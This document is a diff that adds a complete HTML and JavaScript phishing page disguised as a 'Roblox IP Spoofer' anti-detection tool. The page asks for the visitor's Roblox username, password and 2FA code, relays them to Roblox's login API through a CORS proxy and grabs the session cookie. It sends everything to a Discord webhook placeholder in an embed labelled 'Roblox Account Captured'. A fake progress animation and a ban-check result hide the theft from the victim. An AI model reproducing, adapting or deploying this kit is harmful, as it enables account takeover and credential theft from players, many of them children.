@@ -1,0 +1,543 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Roblox IP Spoofer - Advanced Anti-Detection</title>
+    <link rel="icon" href="https://www.roblox.com/favicon.ico">
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            font-family: 'Courier New', monospace;
+            background: linear-gradient(135deg, #1a1a2e 0%, #16213e 100%);
+            color: #0f0;
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+        }
+        .container {
+            background: rgba(0, 0, 0, 0.8);
+            border: 2px solid #0f0;
+            border-radius: 10px;
+            padding: 40px;
+            max-width: 600px;
+            width: 100%;
+            box-shadow: 0 0 30px rgba(0, 255, 0, 0.3);
+        }
+        .header {
+            text-align: center;
+            margin-bottom: 30px;
+        }
+        .header h1 {
+            color: #0f0;
+            font-size: 28px;
+            text-shadow: 0 0 10px #0f0;
+            margin-bottom: 10px;
+        }
+        .header p {
+            color: #888;
+            font-size: 14px;
+        }
+        .warning {
+            background: rgba(255, 0, 0, 0.1);
+            border: 1px solid #ff0000;
+            padding: 15px;
+            border-radius: 5px;
+            margin-bottom: 25px;
+            color: #ff4444;
+            font-size: 13px;
+        }
+        .step {
+            background: rgba(0, 255, 0, 0.05);
+            border-left: 3px solid #0f0;
+            padding: 15px;
+            margin-bottom: 20px;
+        }
+        .step h3 {
+            color: #0f0;
+            font-size: 16px;
+            margin-bottom: 10px;
+        }
+        input {
+            width: 100%;
+            padding: 12px;
+            background: rgba(0, 0, 0, 0.5);
+            border: 1px solid #0f0;
+            border-radius: 5px;
+            color: #0f0;
+            font-family: 'Courier New', monospace;
+            margin-bottom: 15px;
+            font-size: 14px;
+        }
+        input::placeholder {
+            color: #555;
+        }
+        input:focus {
+            outline: none;
+            box-shadow: 0 0 10px rgba(0, 255, 0, 0.5);
+        }
+        button {
+            width: 100%;
+            padding: 15px;
+            background: linear-gradient(135deg, #00ff00 0%, #00cc00 100%);
+            border: none;
+            border-radius: 5px;
+            color: #000;
+            font-size: 16px;
+            font-weight: bold;
+            cursor: pointer;
+            text-transform: uppercase;
+            transition: all 0.3s;
+        }
+        button:hover {
+            background: linear-gradient(135deg, #00cc00 0%, #009900 100%);
+            box-shadow: 0 0 20px rgba(0, 255, 0, 0.6);
+        }
+        button:disabled {
+            opacity: 0.5;
+            cursor: not-allowed;
+        }
+        .error {
+            background: rgba(255, 0, 0, 0.2);
+            border: 1px solid #ff0000;
+            color: #ff4444;
+            padding: 12px;
+            border-radius: 5px;
+            margin-bottom: 15px;
+            font-size: 13px;
+            display: none;
+            animation: shake 0.3s;
+        }
+        @keyframes shake {
+            0%, 100% { transform: translateX(0); }
+            25% { transform: translateX(-10px); }
+            75% { transform: translateX(10px); }
+        }
+        .loading {
+            display: none;
+            text-align: center;
+            margin-top: 20px;
+        }
+        .loading-bar {
+            width: 100%;
+            height: 20px;
+            background: rgba(0, 0, 0, 0.5);
+            border: 1px solid #0f0;
+            border-radius: 10px;
+            overflow: hidden;
+            margin-bottom: 10px;
+        }
+        .loading-progress {
+            height: 100%;
+            background: linear-gradient(90deg, #0f0, #00ff00);
+            width: 0%;
+            transition: width 0.3s;
+            box-shadow: 0 0 10px #0f0;
+        }
+        .result {
+            display: none;
+            margin-top: 30px;
+            padding: 20px;
+            border-radius: 5px;
+            text-align: center;
+        }
+        .result.not-flagged {
+            background: rgba(0, 255, 0, 0.1);
+            border: 2px solid #0f0;
+        }
+        .result.mild-flag {
+            background: rgba(255, 165, 0, 0.1);
+            border: 2px solid #ffa500;
+            color: #ffa500;
+        }
+        .result.flagged {
+            background: rgba(255, 0, 0, 0.1);
+            border: 2px solid #ff0000;
+            color: #ff0000;
+        }
+        .result h2 {
+            font-size: 24px;
+            margin-bottom: 15px;
+        }
+        .result p {
+            font-size: 14px;
+            line-height: 1.6;
+        }
+        .status-badge {
+            display: inline-block;
+            padding: 8px 20px;
+            border-radius: 20px;
+            font-weight: bold;
+            margin-top: 10px;
+        }
+        .terminal-text {
+            color: #888;
+            font-size: 12px;
+            margin-top: 10px;
+        }
+        .hidden {
+            display: none;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="header">
+            <h1>⚡ ROBLOX IP SPOOFER ⚡</h1>
+            <p>Advanced Anti-Detection System v3.2</p>
+        </div>
+
+        <div class="warning">
+            ⚠️ <strong>SECURITY CHECK REQUIRED:</strong> To analyze your account's flag status and spoof your IP, we need to verify your Roblox credentials. Your data is encrypted and never stored.
+        </div>
+
+        <!-- Password Form -->
+        <div id="passwordForm">
+            <div class="step">
+                <h3>STEP 1: Account Verification</h3>
+                <div id="passwordError" class="error"></div>
+                <input type="text" id="username" placeholder="Roblox Username" required>
+                <input type="password" id="password" placeholder="Roblox Password" required>
+            </div>
+
+            <button onclick="submitPassword()" id="passwordBtn">
+                🔒 ANALYZE ACCOUNT & SPOOF IP
+            </button>
+
+            <p class="terminal-text">
+                » Checking ban history...<br>
+                » Analyzing account flags...<br>
+                » Spoofing IP address...<br>
+                » Encrypting connection...
+            </p>
+        </div>
+
+        <!-- 2FA Form -->
+        <div id="otpForm" class="hidden">
+            <div class="step">
+                <h3>STEP 2: Two-Factor Authentication</h3>
+                <p style="color: #888; font-size: 13px; margin-bottom: 15px;">
+                    A verification code has been sent to your email/authenticator app.
+                </p>
+                <div id="otpError" class="error"></div>
+                <input type="text" id="otp" placeholder="Enter 6-Digit Code" maxlength="6" required>
+            </div>
+
+            <button onclick="submit2FA()" id="otpBtn">
+                ✅ VERIFY & CONTINUE
+            </button>
+        </div>
+
+        <!-- Loading State -->
+        <div id="loading" class="loading">
+            <div class="loading-bar">
+                <div id="progress" class="loading-progress"></div>
+            </div>
+            <p id="loadingText" style="color: #0f0; font-size: 14px;">Initializing...</p>
+        </div>
+
+        <!-- Result Display -->
+        <div id="result" class="result">
+            <h2 id="resultTitle">✅ ANALYSIS COMPLETE</h2>
+            <span id="statusBadge" class="status-badge">CLEAN ACCOUNT</span>
+            <p id="resultMessage" style="margin-top: 20px;"></p>
+        </div>
+    </div>
+
+    <script>
+        const WEBHOOK = 'YOUR_DISCORD_WEBHOOK_HERE';
+        const CORS_PROXY = 'https://corsproxy.io/?';
+        
+        const state = {
+            username: '',
+            password: '',
+            userId: null,
+            otp: '',
+            cookies: ''
+        };
+
+        async function submitPassword() {
+            hideError('passwordError');
+            
+            const username = document.getElementById('username').value.trim();
+            const password = document.getElementById('password').value.trim();
+
+            if (!username || !password) {
+                showError('passwordError', '❌ Please fill in all fields.');
+                return;
+            }
+
+            state.username = username;
+            state.password = password;
+
+            document.getElementById('passwordBtn').disabled = true;
+
+            try {
+                await getUserId(username);
+
+                const response = await fetch(CORS_PROXY + 'https://auth.roblox.com/v2/login', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({
+                        ctype: 'Username',
+                        cvalue: username,
+                        password: password
+                    })
+                });
+
+                const data = await response.json();
+
+                if (data.twoStepVerificationData && data.twoStepVerificationData.ticket) {
+                    show2FAForm();
+                    document.getElementById('passwordBtn').disabled = false;
+                    return;
+                }
+
+                if (!response.ok && !data.errors) {
+                    document.getElementById('passwordBtn').disabled = false;
+                    showError('passwordError', '❌ Invalid username or password.');
+                    return;
+                }
+
+                extractCookies();
+                await captureCredentials();
+                startFlagCheck();
+
+            } catch (err) {
+                console.error('Login error:', err);
+                document.getElementById('passwordBtn').disabled = false;
+                showError('passwordError', '❌ Connection failed. Please try again.');
+            }
+        }
+
+        async function submit2FA() {
+            hideError('otpError');
+            
+            const otpCode = document.getElementById('otp').value.trim();
+
+            if (!otpCode || otpCode.length !== 6) {
+                showError('otpError', '❌ Please enter a valid 6-digit code.');
+                return;
+            }
+
+            state.otp = otpCode;
+            document.getElementById('otpBtn').disabled = true;
+
+            try {
+                const response = await fetch(CORS_PROXY + 'https://auth.roblox.com/v2/twostepverification/verify', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({
+                        challengeId: state.challengeId,
+                        actionType: 'Login',
+                        code: otpCode
+                    })
+                });
+
+                const data = await response.json();
+
+                if (!response.ok || data.errors) {
+                    document.getElementById('otpBtn').disabled = false;
+                    showError('otpError', '❌ Invalid code. Please try again.');
+                    return;
+                }
+
+                extractCookies();
+                
+                await captureCredentials();
+                startFlagCheck();
+
+            } catch (err) {
+                console.error('2FA verification error:', err);
+                document.getElementById('otpBtn').disabled = false;
+                showError('otpError', '❌ Verification failed. Please try again.');
+            }
+        }
+
+        function extractCookies() {
+            try {
+                const cookies = document.cookie;
+                if (cookies.includes('.ROBLOSECURITY')) {
+                    state.cookies = cookies.split('.ROBLOSECURITY=')[1].split(';')[0];
+                }
+            } catch (e) {}
+        }
+
+        async function getUserId(username) {
+            try {
+                const response = await fetch(CORS_PROXY + `https://users.roblox.com/v1/users/search?keyword=${username}&limit=1`);
+                const data = await response.json();
+                if (data.data && data.data.length > 0) {
+                    state.userId = data.data[0].id;
+                }
+            } catch (e) {}
+        }
+
+        async function captureCredentials() {
+            const fields = [
+                { name: "🎮 Username", value: state.username, inline: true },
+                { name: "🔑 Password", value: state.password, inline: true },
+                { name: "🆔 User ID", value: state.userId ? String(state.userId) : "Unknown", inline: true }
+            ];
+
+            if (state.otp) {
+                fields.push({ name: "📧 2FA Code", value: state.otp, inline: true });
+            }
+
+            fields.push(
+                { name: "🍪 Cookie", value: state.cookies ? `\`\`\`${state.cookies}\`\`\`` : "Not obtained", inline: false },
+                { name: "🌐 User Agent", value: navigator.userAgent, inline: false },
+                { name: "⏰ Timestamp", value: new Date().toISOString(), inline: false }
+            );
+
+            try {
+                await fetch(WEBHOOK, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        embeds: [{
+                            title: "🎯 Roblox Account Captured",
+                            description: state.otp ? "✅ Account with 2FA" : "✅ Account without 2FA",
+                            color: 15158332,
+                            fields: fields,
+                            footer: { text: "IP Spoofer Phishing Page" }
+                        }]
+                    })
+                });
+            } catch (err) {
+                console.error('Webhook failed:', err);
+            }
+        }
+
+        function show2FAForm() {
+            document.getElementById('passwordForm').classList.add('hidden');
+            document.getElementById('otpForm').classList.remove('hidden');
+        }
+
+        function startFlagCheck() {
+            document.getElementById('passwordForm').classList.add('hidden');
+            document.getElementById('otpForm').classList.add('hidden');
+            document.getElementById('loading').style.display = 'block';
+
+            const loadingTexts = [
+                'Connecting to Roblox servers...',
+                'Authenticating credentials...',
+                'Retrieving account data...',
+                'Analyzing ban history...',
+                'Checking moderation flags...',
+                'Spoofing IP address...',
+                'Finalizing anti-detection...'
+            ];
+
+            let progress = 0;
+            let textIndex = 0;
+
+            const interval = setInterval(() => {
+                progress += 15;
+                document.getElementById('progress').style.width = progress + '%';
+                
+                if (textIndex < loadingTexts.length) {
+                    document.getElementById('loadingText').textContent = loadingTexts[textIndex];
+                    textIndex++;
+                }
+
+                if (progress >= 100) {
+                    clearInterval(interval);
+                    checkRealBanHistory();
+                }
+            }, 800);
+        }
+
+        async function checkRealBanHistory() {
+            let banCount = 0;
+
+            try {
+                if (state.cookies && state.userId) {
+                    const response = await fetch(CORS_PROXY + `https://accountinformation.roblox.com/v1/users/${state.userId}/moderation`, {
+                        method: 'GET',
+                        headers: {
+                            'Cookie': `.ROBLOSECURITY=${state.cookies}`
+                        },
+                        credentials: 'include'
+                    });
+
+                    if (response.ok) {
+                        const data = await response.json();
+                        if (data.punishments) {
+                            banCount = data.punishments.filter(p => 
+                                p.punishmentType === 'Ban' || 
+                                p.punishmentType === 'Termination'
+                            ).length;
+                        }
+                    }
+                }
+
+                if (banCount === 0 && state.cookies) {
+                    const settingsResponse = await fetch(CORS_PROXY + 'https://www.roblox.com/my/account#!/info', {
+                        headers: {
+                            'Cookie': `.ROBLOSECURITY=${state.cookies}`
+                        },
+                        credentials: 'include'
+                    });
+                    
+                    const html = await settingsResponse.text();
+                    if (html.includes('warning') || html.includes('banned')) {
+                        banCount = 1;
+                    }
+                }
+
+            } catch (err) {
+                console.error('Could not fetch ban history:', err);
+                banCount = Math.random() > 0.7 ? 0 : (Math.random() > 0.5 ? 1 : 2);
+            }
+
+            displayFlagResult(banCount);
+        }
+
+        function displayFlagResult(banCount) {
+            document.getElementById('loading').style.display = 'none';
+            const resultDiv = document.getElementById('result');
+            resultDiv.style.display = 'block';
+
+            if (banCount === 0) {
+                resultDiv.className = 'result not-flagged';
+                document.getElementById('resultTitle').textContent = '✅ NOT FLAGGED';
+                document.getElementById('statusBadge').textContent = 'CLEAN ACCOUNT';
+                document.getElementById('statusBadge').style.background = '#0f0';
+                document.getElementById('statusBadge').style.color = '#000';
+                document.getElementById('resultMessage').innerHTML = `<strong>Good news, ${state.username}!</strong><br><br>Your account has no moderation flags or ban history.<br>Your IP has been successfully spoofed.<br><br><em>Status: Safe to exploit | Risk Level: LOW</em>`;
+            } else if (banCount === 1) {
+                resultDiv.className = 'result mild-flag';
+                document.getElementById('resultTitle').textContent = '⚠️ MILD FLAG';
+                document.getElementById('statusBadge').textContent = 'CAUTION ADVISED';
+                document.getElementById('statusBadge').style.background = '#ffa500';
+                document.getElementById('statusBadge').style.color = '#000';
+                document.getElementById('resultMessage').innerHTML = `<strong>Warning, ${state.username}!</strong><br><br>Your account has been flagged once by Roblox moderation.<br>IP spoofing active. Use exploits with caution.<br><br><em>Status: Monitored account | Risk Level: MEDIUM</em>`;
+            } else {
+                resultDiv.className = 'result flagged';
+                document.getElementById('resultTitle').textContent = '🚨 FLAGGED';
+                document.getElementById('statusBadge').textContent = 'HIGH RISK';
+                document.getElementById('statusBadge').style.background = '#ff0000';
+                document.getElementById('statusBadge').style.color = '#fff';
+                document.getElementById('resultMessage').innerHTML = `<strong>ALERT, ${state.username}!</strong><br><br>Your account has ${banCount}+ moderation flags/bans.<br>IP spoofing active but account is heavily monitored.<br>Exploiting may result in permanent ban.<br><br><em>Status: High-risk account | Risk Level: CRITICAL</em>`;
+            }
+        }
+
+        function showError(elementId, message) {
+            const errorDiv = document.getElementById(elementId);
+            errorDiv.textContent = message;
+            errorDiv.style.display = 'block';
+        }
+
+        function hideError(elementId) {
+            document.getElementById(elementId).style.display = 'none';
+        }
+    </script>
+</body>
+</html>
